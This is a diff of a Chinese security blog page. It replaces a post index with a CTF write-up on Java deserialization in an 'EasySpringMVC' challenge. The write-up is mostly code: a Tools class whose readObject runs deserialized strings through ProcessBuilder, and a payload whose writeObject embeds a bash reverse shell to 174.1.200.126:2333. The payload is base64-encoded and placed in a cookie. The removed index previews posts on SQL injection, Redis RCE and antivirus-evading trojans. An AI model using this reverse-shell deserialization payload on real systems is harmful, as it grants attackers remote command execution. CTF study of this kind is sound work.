@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
   <head>
       <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>过客</title>
+  <title>[V&amp;N2020 公开赛]EasySpringMVC（java反序列化） | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[V&amp;N2020 公开赛]EasySpringMVC（java反序列化） | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,9 +25,15 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="[V&amp;N2020 公开赛]EasySpringMVC（java反序列化）"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/krTn36zK9/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
   </head>
   <body>
-     <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
       <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
@@ -65,142 +71,166 @@
       </div>
     </div>
   </nav>
+  <!-- Page Header -->
   <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <div class="site-heading">
-            <h1>过客</h1>
-            <span class="subheading">TEST</span>
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[V&amp;N2020 公开赛]EasySpringMVC（java反序列化）</h1>
+            <span class="meta">
+            	Posted on
+              2020-06-12，4 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
-      <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-md-10 mx-auto">
-       
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/Olw-A4WVi/">
-            <h2 class="post-title">
-              Mysql limit注入
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>实验环境</strong><br>
-http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</p>
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/metasploit-sheng-cheng-mian-sha-mu-ma/">
-            <h2 class="post-title">
-              Metasploit生成免杀木马
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>环境准备</strong><br>
-1.安装软件如下<br>
-python2.7<br>
-pyinstaller<br>
-pywin32<br>
-32位系统，我这里用的是XP</p>
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>war下下来。反编译下<br>
+得到源码<br>
+ClientInfo.java</p>
+<pre><code>package com.tools;
+import java.io.Serializable;
+public class ClientInfo implements Serializable{
+//定义了一个ClientInfo类。并且有serializeable接口
+  private static final long serialVersionUID = 1L;
+  private String name;
+  private String group;
+  private String id;
+//类内有三个私有属性。name，group，id
+  public ClientInfo(String name, String group, String id) {
+//析构函数。对类内的私有属性赋值
+    this.name = name;
+    this.group = group;
+    this.id = id;
+  }
+  public String getName() { return this.name; }
+  public String getGroup() { return this.group; }
+  public String getId() { return this.id; }
+//三个获取私有值的函数
+}
+</code></pre>
+<p>Tools.java</p>
+<pre><code>package com.tools;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+public class Tools implements Serializable {
+//定义了一个Tools类实现了seiralizable接口
+  private static final long serialVersionUID = 1L;
+  public static Object parse(byte[] bytes) throws Exception {
+    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+    return ois.readObject();
+  }
+  private String testCall;
+//定义私有属性
+  public static byte[] create(Object obj) throws Exception {
+//定义create函数。会把输入的object。最后变成字节数组。对象输出流(字节数组输出流)
+    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+    ObjectOutputStream outputStream = new ObjectOutputStream(bos);
+    outputStream.writeObject(obj);
+    return bos.toByteArray();
+  }
+  private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+//readObject。会在反序列化的时候自动调用。这里obj参数可控。任意命令执行
+    Object obj = in.readObject();
+    (new ProcessBuilder((String[])obj)).start();
+  }
+}
+</code></pre>
+<p>java在序列化的时候。会触发writeobject方法<br>
+在反序列化的时候。会触发readobject方法<br>
+在tools类中。调用反序列化的时候触发readobject。就会将恶意的字符串执行<br>
+这边我们只需要控制obj的值<br>
+那么继续看。obj的值是从哪来的。<br>
+是readObject方法中<code>in.readObject()</code>方法得来的<br>
+<img src="https://guokeya.github.io/post-images/1591965517161.jpg" alt="" loading="lazy"><br>
+可以看到。这里readobject读取的是writeobject的值。<br>
+那么我们直接用writeobject对一个tools类进行写入值。然后readobject读取的时候就会读取到恶意的字符串。然后带入执行</p>
+<p>最终的payload</p>
+<pre><code>package com.tools;
+import java.io.*;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">8 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/redis-rce-lou-dong-fu-xian/">
-            <h2 class="post-title">
-              Redis RCE 漏洞复现
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>影响范围</strong><br>
-Redis 4.x-Redis 5.x 未授权利用</p>
+public class Tools implements Serializable {
+  private static final long serialVersionUID = 1L;
+  
+  public static Object parse(byte[] bytes) throws Exception {
+    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+    return ois.readObject();
+  }
+  private String testCall;
+  public static byte[] create(Object obj) throws Exception {
+    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+    ObjectOutputStream outputStream = new ObjectOutputStream(bos);
+    outputStream.writeObject(obj);
+    return bos.toByteArray();
+  }
+  
+  private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+    Object obj = in.readObject();
+    (new ProcessBuilder((String[])obj)).start();
+  }
+  private void writeObject(ObjectOutputStream out) throws IOException,ClassNotFoundException{
+    String command[]={&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i&gt;&amp; /dev/tcp/174.1.200.126/2333 0&gt;&amp;1&quot;};
+    out.writeObject(command);
+  }
+</code></pre>
+<p>Main.java</p>
+<pre><code>package com.tools;
+import java.io.*;
+import java.util.Base64;
+import com.tools.*;
+public class Main {
+    public static void main(String[] args) {
+        Base64.Encoder encoder = Base64.getEncoder();
+	try {
+            Tools cinfo = new Tools();
+            byte[] bytes = Tools.create(cinfo);
+            String payload = encoder.encodeToString(bytes);
+            System.out.println(payload);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">1 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/cve-2019-0193apache-solr-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian/">
-            <h2 class="post-title">
-              CVE-2019-0193:Apache Solr远程命令执行漏洞复现
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>影响范围</strong><br>
-Apache Solr &lt; 8.2.0</p>
+    }
+}
+</code></pre>
+<p>替换cookie就行了</p>
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/">
-            <h2 class="post-title">
-              利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-            </h2>
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/sfeeWJUlS/">
+              <span class="post-title">
+                ACTF PasteBin(JWT)伪造&rarr;
+              </span>
             </a>
-            <h3 class="post-subtitle">
-              <p><strong>利用条件</strong><br>
-php未禁用putenv，mail函数</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">4 min read</span>
-            </p>
+          </p>
+        
+        <div class="comment">
+          
         </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        
-        <a class="btn btn-primary float-left" href="https://guokeya.github.io/page/15/">&larr; 上一页</a>
-        
-        
       </div>
     </div>
-  </div>
-
-  
-    <!-- Footer -->
+  </article>
+ <!-- Footer -->
   <footer>
     <div class="container">
       <div class="row">
@@ -280,3 +310,4 @@ php未禁用putenv，mail函数</p>
   })(this));</script>
   </body>
 </html>
+
